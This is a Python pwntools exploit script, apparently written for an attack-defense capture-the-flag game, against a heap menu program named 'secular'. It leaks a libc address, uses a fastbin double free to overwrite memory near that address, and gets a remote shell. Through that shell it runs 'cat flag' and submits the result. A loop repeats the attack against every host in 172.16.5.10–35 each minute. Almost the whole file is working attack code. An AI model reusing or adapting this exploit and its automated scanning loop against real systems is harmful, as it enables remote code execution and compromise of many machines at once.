from pwn import *
from submit import *

#context(log_level = 'debug')

#DEBUG = 1

#ip, port = '172.16.5.20', 5055

def ia():
    io.interactive()

def att():
    gdb.attach(io,"source bp")

def sl(data):
    io.sendline(str(data))

def se(data):
    io.send(str(data))

def ru(delim):
    data=io.recvuntil(delim)
    return data

def rl(len):
    data=io.recv(len)
    return data

def add(length, name, number):
    ru('Your Choice :')
    sl('1')
    ru('Input Length of Name:\n')
    sl(str(length))
    ru('Input Your Name:')
    se(name)
    ru('Input Your Luckynumber:')
    sl(str(number))

def ope(choice, index):
    ru('Your Choice :')
    sl(str(choice))
    ru('Input Index:')
    sl(str(index))

def attack(ip=0):
    global io
    if ip==0:
        io=process("./secular")
    else:
        io = remote(ip, 5055)

    add(160, 'a' * 160, 1)
    add(160, 'a' * 160, 1)
    ope(3, 0)
    add(128, 'a' * 8, 1)
    ope(2, 2)
    ru('aaaaaaaa')
    addr = u64(ru("\n")[:-1].ljust(8, '\x00'))
    add(96, 'a', 1)
    add(96, 'a', 1)
    add(16, 'a', 1)
    ope(3, 3)
    ope(3, 4)
    ope(3, 3)
    add(96, p64(addr - 123), 1)
    add(96, 'a', 1)
    add(96, 'a', 1)
    add(96, 'aaa' + p64(addr - 2967764), 1)
    ope(3, 2)
    ope(3, 2)
    ru("***")
    sl("echo 123;cat flag")
    ru("123\n")
    flag=ru("\n")[:-1]
   # print flag
    submit(flag)
    io.close()
#attack()
#raw_input()
while True:
    for ip in range(10,36):
        try:
            attack("172.16.5."+str(ip))
        except:
            continue
    sleep(60)

